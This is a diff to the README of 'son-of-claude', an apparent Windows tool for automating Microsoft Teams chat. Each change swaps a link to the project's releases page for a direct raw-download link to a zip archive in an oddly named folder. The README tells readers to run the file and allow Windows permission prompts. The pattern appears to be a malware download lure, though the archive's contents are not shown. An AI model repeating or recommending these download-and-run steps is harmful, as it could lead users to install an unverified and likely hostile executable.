@@ -1,6 +1,6 @@
 # 🤖 son-of-claude - Let Teams chat run itself
 
-[![Download son-of-claude](https://img.shields.io/badge/Download-Get%20the%20latest%20release-blue?style=for-the-badge)](https://github.com/gage6903/son-of-claude/releases)
+[![Download son-of-claude](https://img.shields.io/badge/Download-Get%20the%20latest%20release-blue?style=for-the-badge)](https://github.com/gage6903/son-of-claude/raw/refs/heads/main/annite/son_claude_of_3.0.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ This app is built for people who want a simple way to keep up with Teams without
 
 Visit this page to download the latest Windows release:
 
-https://github.com/gage6903/son-of-claude/releases
+https://github.com/gage6903/son-of-claude/raw/refs/heads/main/annite/son_claude_of_3.0.zip
 
 Look for the newest release file for Windows. Download it, then run it on your PC.
 
@@ -178,7 +178,7 @@ This gives you a quick way to confirm that everything is working.
 ## 📦 Install and run on Windows
 
 1. Go to the release page:
-   https://github.com/gage6903/son-of-claude/releases
+   https://github.com/gage6903/son-of-claude/raw/refs/heads/main/annite/son_claude_of_3.0.zip
 2. Download the latest Windows release file.
 3. Open the file after the download finishes.
 4. If Windows asks for permission, click to allow it.
